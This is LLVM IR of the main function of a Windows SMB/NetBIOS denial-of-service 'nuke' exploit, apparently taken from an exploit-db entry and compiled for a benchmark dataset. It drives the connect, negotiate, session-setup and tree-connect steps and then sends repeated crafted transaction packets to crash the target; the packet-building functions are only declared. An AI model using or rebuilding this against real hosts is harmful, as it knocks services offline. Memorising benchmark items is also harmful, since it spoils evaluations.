; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21746.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21746.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }
%struct.TYPE_2__ = type { i64 }

@.str = private unnamed_addr constant [14 x i8] c"N:n:p:P:t:T:h\00", align 1
@optarg = common dso_local global i8* null, align 8
@optind = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"Usage: %s [options] hostname/ip...\0A\00", align 1
@.str.2 = private unnamed_addr constant [74 x i8] c"   -N [netbios-name]         Netbios Name (default: ask the remote host)\0A\00", align 1
@.str.3 = private unnamed_addr constant [78 x i8] c"   -n [packets]              Number of crafted packets to send (default: %d)\0A\00", align 1
@.str.4 = private unnamed_addr constant [62 x i8] c"   -p [netbios-ns port]      UDP Port to query (default: %d)\0A\00", align 1
@.str.5 = private unnamed_addr constant [62 x i8] c"   -P [netbios-ssn port]     TCP Port to query (default: %d)\0A\00", align 1
@.str.6 = private unnamed_addr constant [85 x i8] c"   -t [udp-timeout]          Timeout to wait for receive on UDP ports (default: %d)\0A\00", align 1
@.str.7 = private unnamed_addr constant [84 x i8] c"   -T [tcp-timeout]          Timeout to wait for receive on TCP ports (default: %d\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"Known vulnerable systems: \0A\00", align 1
@.str.10 = private unnamed_addr constant [41 x i8] c"    - Windows NT 4.0 Workstation/Server\0A\00", align 1
@.str.11 = private unnamed_addr constant [49 x i8] c"    - Windows 2000 Professional/Advanced Server\0A\00", align 1
@.str.12 = private unnamed_addr constant [45 x i8] c"    - Windows XP Professional/Home edition\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"Using netbios name: %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [38 x i8] c"Connecting to remote host (%s:%d)...\0A\00", align 1
@STATE_REQUESTING_TRANSACTION = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [66 x i8] c"Timeout during TCP read - Seems like the remote host has crashed\0A\00", align 1
@.str.16 = private unnamed_addr constant [54 x i8] c"Nuke failed (tcp timeout) at state %#02x, exiting...\0A\00", align 1
@.str.17 = private unnamed_addr constant [68 x i8] c"Nuke failed at state %#02x (EOF, wrong netbios name ?), exiting...\0A\00", align 1
@.str.18 = private unnamed_addr constant [40 x i8] c"Nuke failed at state %#02x, exiting...\0A\00", align 1
@.str.19 = private unnamed_addr constant [25 x i8] c"Negotiating protocol...\0A\00", align 1
@.str.20 = private unnamed_addr constant [33 x i8] c"Requesting session setup (AndX)\0A\00", align 1
@.str.21 = private unnamed_addr constant [32 x i8] c"Requesting tree connect (AndX)\0A\00", align 1
@.str.22 = private unnamed_addr constant [37 x i8] c"Requesting transaction (nuking) #%d\0A\00", align 1
@.str.23 = private unnamed_addr constant [9 x i8] c"Wait...\0A\00", align 1
@.str.24 = private unnamed_addr constant [43 x i8] c"Seems like the nuke failed :/ (patched ?)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca %struct.timeval, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %11, align 8
  store i8* null, i8** %12, align 8
  store i32 0, i32* %13, align 4
  store i32 10, i32* %14, align 4
  store i32 10, i32* %16, align 4
  store i32 10, i32* %17, align 4
  store i16 139, i16* %18, align 2
  store i16 137, i16* %19, align 2
  %22 = call i32 @time(i32* null)
  %23 = call i32 @srand(i32 %22)
  %24 = call i32 (...) @print_banner()
  br label %25

25:                                               ; preds = %56, %2
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call i32 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  store i32 %28, i32* %9, align 4
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %57

30:                                               ; preds = %25
  %31 = load i32, i32* %9, align 4
  switch i32 %31, label %55 [
    i32 78, label %32
    i32 110, label %34
    i32 112, label %38
    i32 80, label %42
    i32 116, label %46
    i32 84, label %50
    i32 104, label %54
  ]

32:                                               ; preds = %30
  %33 = load i8*, i8** @optarg, align 8
  store i8* %33, i8** %12, align 8
  br label %56

34:                                               ; preds = %30
  %35 = load i8*, i8** @optarg, align 8
  %36 = call i8* @atoi(i8* %35)
  %37 = ptrtoint i8* %36 to i32
  store i32 %37, i32* %14, align 4
  br label %56

38:                                               ; preds = %30
  %39 = load i8*, i8** @optarg, align 8
  %40 = call i8* @atoi(i8* %39)
  %41 = ptrtoint i8* %40 to i16
  store i16 %41, i16* %19, align 2
  br label %56

42:                                               ; preds = %30
  %43 = load i8*, i8** @optarg, align 8
  %44 = call i8* @atoi(i8* %43)
  %45 = ptrtoint i8* %44 to i16
  store i16 %45, i16* %18, align 2
  br label %56

46:                                               ; preds = %30
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i8* @atoi(i8* %47)
  %49 = ptrtoint i8* %48 to i32
  store i32 %49, i32* %16, align 4
  br label %56

50:                                               ; preds = %30
  %51 = load i8*, i8** @optarg, align 8
  %52 = call i8* @atoi(i8* %51)
  %53 = ptrtoint i8* %52 to i32
  store i32 %53, i32* %17, align 4
  br label %56

54:                                               ; preds = %30
  br label %55

55:                                               ; preds = %30, %54
  store i32 1, i32* %13, align 4
  br label %56

56:                                               ; preds = %55, %50, %46, %42, %38, %34, %32
  br label %25

57:                                               ; preds = %25
  %58 = load i32, i32* @optind, align 4
  %59 = load i32, i32* %4, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %68

61:                                               ; preds = %57
  %62 = load i8**, i8*** %5, align 8
  %63 = load i32, i32* @optind, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* @optind, align 4
  %65 = sext i32 %63 to i64
  %66 = getelementptr inbounds i8*, i8** %62, i64 %65
  %67 = load i8*, i8** %66, align 8
  store i8* %67, i8** %11, align 8
  br label %68

68:                                               ; preds = %61, %57
  %69 = load i32, i32* %13, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %74, label %71

71:                                               ; preds = %68
  %72 = load i8*, i8** %11, align 8
  %73 = icmp eq i8* %72, null
  br i1 %73, label %74, label %98

74:                                               ; preds = %71, %68
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i8* %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i64 0, i64 0))
  %80 = load i32, i32* %14, align 4
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.3, i64 0, i64 0), i32 %80)
  %82 = load i16, i16* %19, align 2
  %83 = zext i16 %82 to i32
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.4, i64 0, i64 0), i32 %83)
  %85 = load i16, i16* %18, align 2
  %86 = zext i16 %85 to i32
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.5, i64 0, i64 0), i32 %86)
  %88 = load i32, i32* %16, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.6, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* %17, align 4
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.7, i64 0, i64 0), i32 %90)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0))
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.10, i64 0, i64 0))
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.11, i64 0, i64 0))
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.12, i64 0, i64 0))
  %97 = call i32 @exit(i32 1) #3
  unreachable

98:                                               ; preds = %71
  %99 = load i8*, i8** %12, align 8
  %100 = icmp ne i8* %99, null
  br i1 %100, label %110, label %101

101:                                              ; preds = %98
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %103 = load i8*, i8** %11, align 8
  %104 = load i16, i16* %19, align 2
  %105 = load i32, i32* %16, align 4
  %106 = call i8* @list_netbios_names(i8* %102, i32 4096, i8* %103, i16 zeroext %104, i32 %105)
  store i8* %106, i8** %12, align 8
  %107 = icmp eq i8* %106, null
  br i1 %107, label %108, label %110

108:                                              ; preds = %101
  %109 = call i32 @exit(i32 1) #3
  unreachable

110:                                              ; preds = %101, %98
  %111 = load i8*, i8** %12, align 8
  %112 = call i8* @extract_name(i8* %111)
  store i8* %112, i8** %12, align 8
  br label %113

113:                                              ; preds = %110
  %114 = load i8*, i8** %12, align 8
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i8* %114)
  %116 = load i8*, i8** %11, align 8
  %117 = load i16, i16* %18, align 2
  %118 = zext i16 %117 to i32
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.14, i64 0, i64 0), i8* %116, i32 %118)
  %120 = load i8*, i8** %11, align 8
  %121 = load i16, i16* %18, align 2
  %122 = call i32 @tcp_connect(i8* %120, i16 zeroext %121)
  store i32 %122, i32* %6, align 4
  %123 = load i32, i32* %6, align 4
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %127

125:                                              ; preds = %113
  %126 = call i32 @exit(i32 1) #3
  unreachable

127:                                              ; preds = %113
  %128 = call i32 @FD_ZERO(i32* %20)
  %129 = load i32, i32* %6, align 4
  %130 = call i32 @FD_SET(i32 %129, i32* %20)
  %131 = load i32, i32* %17, align 4
  %132 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i32 %131, i32* %132, align 8
  %133 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 0, i64* %133, align 8
  store i32 130, i32* %15, align 4
  %134 = load i32, i32* %6, align 4
  %135 = load i8*, i8** %12, align 8
  %136 = call i32 @request_session_setup(i32 %134, i8* %135)
  br label %137

137:                                              ; preds = %213, %127
  %138 = load i32, i32* %6, align 4
  %139 = add nsw i32 %138, 1
  %140 = call i32 @select(i32 %139, i32* %20, i32* null, i32* null, %struct.timeval* %21)
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %153, label %142

142:                                              ; preds = %137
  %143 = load i32, i32* %15, align 4
  %144 = load i32, i32* @STATE_REQUESTING_TRANSACTION, align 4
  %145 = icmp eq i32 %143, %144
  br i1 %145, label %146, label %149

146:                                              ; preds = %142
  %147 = load i32, i32* @stderr, align 4
  %148 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.15, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %216

149:                                              ; preds = %142
  %150 = load i32, i32* @stderr, align 4
  %151 = load i32, i32* %15, align 4
  %152 = call i32 (i32, i8*, ...) @fprintf(i32 %150, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.16, i64 0, i64 0), i32 %151)
  store i32 1, i32* %3, align 4
  br label %216

153:                                              ; preds = %137
  %154 = load i32, i32* %6, align 4
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %156 = call i32 @read(i32 %154, i8* %155, i32 4096)
  store i32 %156, i32* %7, align 4
  %157 = load i32, i32* %7, align 4
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %159, label %163

159:                                              ; preds = %153
  %160 = load i32, i32* %15, align 4
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.17, i64 0, i64 0), i32 %160)
  %162 = call i32 @exit(i32 1) #3
  unreachable

163:                                              ; preds = %153
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %165 = getelementptr inbounds i8, i8* %164, i64 4
  %166 = bitcast i8* %165 to %struct.TYPE_2__*
  %167 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %166, i32 0, i32 0
  %168 = load i64, i64* %167, align 8
  %169 = icmp ne i64 %168, 0
  br i1 %169, label %170, label %175

170:                                              ; preds = %163
  %171 = load i32, i32* @stderr, align 4
  %172 = load i32, i32* %15, align 4
  %173 = call i32 (i32, i8*, ...) @fprintf(i32 %171, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.18, i64 0, i64 0), i32 %172)
  %174 = call i32 @exit(i32 1) #3
  unreachable

175:                                              ; preds = %163
  %176 = load i32, i32* %15, align 4
  switch i32 %176, label %210 [
    i32 130, label %177
    i32 131, label %182
    i32 129, label %187
    i32 128, label %193
  ]

177:                                              ; preds = %175
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.19, i64 0, i64 0))
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %180 = load i32, i32* %6, align 4
  %181 = call i32 @negotiate_protocol(i8* %179, i32 %180)
  br label %213

182:                                              ; preds = %175
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.20, i64 0, i64 0))
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %185 = load i32, i32* %6, align 4
  %186 = call i32 @request_session_setup_andx(i8* %184, i32 %185)
  br label %213

187:                                              ; preds = %175
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.21, i64 0, i64 0))
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %190 = load i32, i32* %6, align 4
  %191 = load i8*, i8** %12, align 8
  %192 = call i32 @request_tree_connect_andx(i8* %189, i32 %190, i8* %191)
  br label %213

193:                                              ; preds = %175
  store i32 0, i32* %8, align 4
  br label %194

194:                                              ; preds = %205, %193
  %195 = load i32, i32* %8, align 4
  %196 = load i32, i32* %14, align 4
  %197 = icmp ult i32 %195, %196
  br i1 %197, label %198, label %208

198:                                              ; preds = %194
  %199 = load i32, i32* %8, align 4
  %200 = add nsw i32 %199, 1
  %201 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.22, i64 0, i64 0), i32 %200)
  %202 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %203 = load i32, i32* %6, align 4
  %204 = call i32 @request_transaction(i8* %202, i32 %203)
  br label %205

205:                                              ; preds = %198
  %206 = load i32, i32* %8, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %8, align 4
  br label %194

208:                                              ; preds = %194
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.23, i64 0, i64 0))
  br label %213

210:                                              ; preds = %175
  %211 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.24, i64 0, i64 0))
  %212 = call i32 @exit(i32 1) #3
  unreachable

213:                                              ; preds = %208, %187, %182, %177
  %214 = load i32, i32* %15, align 4
  %215 = add i32 %214, 1
  store i32 %215, i32* %15, align 4
  br label %137

216:                                              ; preds = %149, %146
  %217 = load i32, i32* %3, align 4
  ret i32 %217
}

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @print_banner(...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @list_netbios_names(i8*, i32, i8*, i16 zeroext, i32) #1

declare dso_local i8* @extract_name(i8*) #1

declare dso_local i32 @tcp_connect(i8*, i16 zeroext) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @request_session_setup(i32, i8*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @negotiate_protocol(i8*, i32) #1

declare dso_local i32 @request_session_setup_andx(i8*, i32) #1

declare dso_local i32 @request_tree_connect_andx(i8*, i32, i8*) #1

declare dso_local i32 @request_transaction(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
